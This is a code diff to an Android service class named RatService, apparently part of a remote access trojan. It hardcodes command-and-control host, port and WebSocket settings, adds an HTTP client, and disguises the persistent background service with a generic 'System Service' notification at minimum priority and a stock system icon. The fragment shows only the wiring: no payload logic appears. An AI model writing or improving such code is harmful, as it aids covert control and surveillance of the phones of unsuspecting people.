@@ -15,11 +15,16 @@ import android.os.Looper
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.minimal.rat.R
-import com.minimal.rat.util.{DeviceUtils, NetworkUtils, PreferencesManager}
+import com.minimal.rat.util.DeviceUtils
+import com.minimal.rat.util.NetworkUtils
+import com.minimal.rat.util.PreferencesManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.launch
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.Response
 import org.json.JSONObject
 import java.net.URI
 import java.util.concurrent.ConcurrentHashMap
@@ -39,10 +44,10 @@ class RatService : Service() {
     private val isConnected = java.util.concurrent.atomic.AtomicBoolean(false)
     private var reconnectAttempts = 0
     private val maxReconnectAttempts = 10
-    private lateinit var c2Host: String
-    private lateinit var c2Port: Int
-    private lateinit var c2Protocol: String
-    private lateinit var c2WsUrl: String
+    private var c2Host = "10.0.2.2"
+    private var c2Port = 8080
+    private var c2Protocol = "http"
+    private var c2WsUrl = "ws://10.0.2.2:8080/ws"
 
     override fun onCreate() {
         super.onCreate()
@@ -57,7 +62,7 @@ class RatService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
 
     override fun onDestroy() {
-        scope.coroutineContext.cancel()
+        scope.cancel()
         instance = null
         super.onDestroy()
     }
@@ -98,7 +103,7 @@ class RatService : Service() {
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Service")
             .setContentText("Running...")
-            .setSmallIcon(R.mipmap.ic_launcher)
+            .setSmallIcon(android.R.drawable.ic_menu_manage)
             .setContentIntent(pendingIntent)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
